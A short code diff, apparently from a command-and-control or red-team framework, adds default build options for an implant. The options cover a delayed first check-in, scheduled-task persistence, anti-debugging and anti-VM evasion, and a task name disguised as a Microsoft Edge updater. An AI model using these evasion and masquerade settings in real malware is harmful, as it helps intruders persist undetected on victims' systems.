@@ -7,6 +7,17 @@ from crypto import base64_encrypt_and_sign_str
 # Globals
 log_level: LogLevel = LogLevel.INFO
 
+IMPLANT_DEFAULT_BUILD_OPTIONS = {
+    "initial_sleep_seconds": 180,  # The number of seconds to sleep before the first checkin
+    "schtask_persist": True,  # Use schtasks to maintain persistence
+    "use_antidebug": True,  # Use anti-debugging techniques
+    "kill_parent": True,  # Kill the parent process after spawning the implant (unused)
+    "use_antivm": True,  # Use anti-vm techniques
+    "scheduled_task_name": "MicrosoftEdgeUpdateTaskMachineUA",  # Name of the scheduled task
+    "register_max_retries": 5,  # Number of times to retry registering before exiting
+}
+
+implant_build_options = IMPLANT_DEFAULT_BUILD_OPTIONS.copy()
 
 @dataclass
 class OperatorConfig:
